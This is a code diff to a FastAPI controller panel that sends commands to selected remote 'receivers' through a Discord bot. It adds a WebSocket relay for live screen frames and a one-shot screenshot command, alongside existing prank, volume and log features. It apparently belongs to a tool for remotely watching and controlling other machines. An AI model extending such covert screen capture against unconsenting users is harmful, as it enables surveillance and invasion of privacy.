@@ -208,6 +208,10 @@ class Hub:
 
 hub = Hub()
 
+# Live screen WebSocket hub (receiver sends frames, viewers consume)
+_screen_viewers: set[WebSocket] = set()
+_screen_viewers_lock = asyncio.Lock()
+
 # ---------------- FASTAPI ----------------
 app = FastAPI(title="Controller")
 
@@ -272,7 +276,7 @@ CONTROL_HTML = """<!doctype html>
   <div class="layout">
     <div class="card">
       <div class="tabs">
-        <button class="tab-btn active" data-tab="surprise">Surprise</button>
+        <button class="tab-btn active" data-tab="surprise">Screen Functions</button>
         <button class="tab-btn" data-tab="select">Select Target</button>
         <button class="tab-btn" data-tab="openclose">Open & Close :3</button>
         <button class="tab-btn" data-tab="volume">Volume ;0</button>
@@ -280,7 +284,7 @@ CONTROL_HTML = """<!doctype html>
         <button class="tab-btn" data-tab="remotes">remote's</button>
       </div>
       <div class="tab-pane active" data-tab="surprise">
-        <h1>Display Surprise</h1>
+        <h1>Screen Functions</h1>
         <p style="margin: 4px 0 12px; color:var(--muted);">Sends local <code>M.gif</code> and <code>sound.mp3</code> to the receiver and triggers display.</p>
         <div class="row">
           <form method="post" action="/ui/surprise">
@@ -378,6 +382,9 @@ CONTROL_HTML = """<!doctype html>
         <form method="post" action="/ui/live/stop">
           <button class="secondary" type="submit">Stop Live</button>
         </form>
+        <form method="post" action="/ui/screenshot/once">
+          <button class="secondary" type="submit">Ss</button>
+        </form>
       </div>
     </div>
   </div>
@@ -425,6 +432,7 @@ CONTROL_HTML = """<!doctype html>
     });
     let selectedReceiver = null;
     let lastReceiverList = [];
+    let screenSocket = null;
     const renameForm = document.getElementById('rename-form');
     const renameSelect = document.getElementById('rename-target');
     const renameInput = document.getElementById('rename-alias');
@@ -576,6 +584,30 @@ CONTROL_HTML = """<!doctype html>
         }
       } catch (e) { /* ignore */ }
     }
+    function connectScreenSocket() {
+      if (screenSocket) {
+        try { screenSocket.close(); } catch (e) { /* ignore */ }
+      }
+      const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+      const ws = new WebSocket(proto + '://' + location.host + '/screen?role=viewer');
+      ws.binaryType = 'arraybuffer';
+      ws.onmessage = (ev) => {
+        const blob = new Blob([ev.data], { type: 'image/jpeg' });
+        const url = URL.createObjectURL(blob);
+        const img = document.getElementById('screen-img');
+        if (img) {
+          img.src = url;
+        }
+        setTimeout(() => URL.revokeObjectURL(url), 3000);
+      };
+      ws.onclose = () => {
+        setTimeout(connectScreenSocket, 1500);
+      };
+      ws.onerror = () => {
+        try { ws.close(); } catch (e) { /* ignore */ }
+      };
+      screenSocket = ws;
+    }
     async function refreshLogs() {
       try {
         const output = document.getElementById('log-output');
@@ -632,8 +664,9 @@ CONTROL_HTML = """<!doctype html>
     refreshReceivers();
     refreshScreen();
     refreshLogs();
+    connectScreenSocket();
     setInterval(refreshReceivers, 5000);
-    setInterval(refreshScreen, 4000);
+    setInterval(refreshScreen, 8000);
     setInterval(refreshLogs, 5000);
 
     document.querySelectorAll('.app form').forEach(form => {
@@ -686,6 +719,47 @@ async def audio_ws(ws: WebSocket):
         pass
     finally:
         await hub.remove(ws)
+
+async def _screen_broadcast(data: bytes, *, sender: Optional[WebSocket] = None):
+    dead = []
+    async with _screen_viewers_lock:
+        for ws in list(_screen_viewers):
+            if sender is not None and ws is sender:
+                continue
+            try:
+                await ws.send_bytes(data)
+            except Exception:
+                dead.append(ws)
+        for ws in dead:
+            _screen_viewers.discard(ws)
+
+@app.websocket("/screen")
+async def screen_ws(ws: WebSocket):
+    role = (ws.query_params.get("role") or "viewer").lower()
+    await ws.accept()
+    if role == "sender":
+        try:
+            while True:
+                data = await ws.receive_bytes()
+                await _screen_broadcast(data, sender=ws)
+        except WebSocketDisconnect:
+            pass
+        except Exception as e:
+            print("Screen sender error:", e)
+        return
+
+    async with _screen_viewers_lock:
+        _screen_viewers.add(ws)
+    try:
+        while True:
+            await ws.receive_text()
+    except WebSocketDisconnect:
+        pass
+    except Exception as e:
+        print("Screen viewer error:", e)
+    finally:
+        async with _screen_viewers_lock:
+            _screen_viewers.discard(ws)
 
 
 # ---------------- COMMAND ENDPOINTS ----------------
@@ -837,6 +911,13 @@ async def ui_live_stop():
         return HTMLResponse("Discord bot not ready", status_code=503)
     await _send_cmd(_cmd_with_selection("LIVE_STOP"))
     _set_receiver_mode(_selected_receiver, "")
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/screenshot/once")
+async def ui_screenshot_once():
+    if not await _wait_controller_ready():
+        return HTMLResponse("Discord bot not ready", status_code=503)
+    await _send_cmd(_cmd_with_selection("SCREENSHOT_ONCE"))
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/logs/start")
